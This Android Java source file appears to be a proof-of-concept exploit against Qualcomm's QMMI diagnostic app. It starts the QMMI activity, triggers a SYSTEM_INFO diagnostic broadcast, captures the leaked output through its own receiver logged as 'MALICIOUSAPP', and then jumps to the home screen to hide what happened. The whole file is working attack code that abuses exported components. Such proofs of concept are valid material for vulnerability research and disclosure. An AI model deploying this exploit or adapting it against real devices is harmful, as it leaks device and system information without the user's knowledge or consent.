package dev.virtualpatch.qualcomqmmileaker;

import androidx.appcompat.app.AppCompatActivity;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ((TextView)findViewById(R.id.logLbl)).setMovementMethod(new ScrollingMovementMethod());
        registerLeaker();
        startAttack();
    }

    private void registerLeaker() {
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("qualcomm.qti.qmmi.UPDATE_MESSAGE");
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (intent == null || !intent.hasExtra("msg"))
                    return;
                if ("qualcomm.qti.qmmi.UPDATE_MESSAGE".equals(intent.getAction())) {
                    TextView viewLog = ((TextView)findViewById(R.id.logLbl));
                    viewLog.setText("");
                    String msg = intent.getStringExtra("msg");
                    String[] msg_strs = msg.split("\\n");
                    for (String msg_str : msg_strs) {
                        Log.d("MALICIOUSAPP", msg_str);
                        viewLog.append(msg_str + "\n");
                    }
                }
            }
        }, intentFilter);
    }

    private void startAttack() {
        Intent intent = new Intent();
        intent.setClassName("com.qualcomm.qti.qmmi",
                "com.qualcomm.qti.qmmi.framework.MainActivity");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
        try {
            Thread.sleep(3500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        Intent broadcast_intent = new Intent();
        broadcast_intent.setAction("qualcomm.qti.qmmi.DIAG_START_TESTCAST");
        broadcast_intent.putExtra("case_name", "SYSTEM_INFO");
        sendBroadcast(broadcast_intent);
        try {
            Thread.sleep(7000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        Intent home_screen_intent = new Intent("android.intent.action.MAIN");
        home_screen_intent.addCategory("android.intent.category.HOME");
        home_screen_intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(home_screen_intent);
    }
}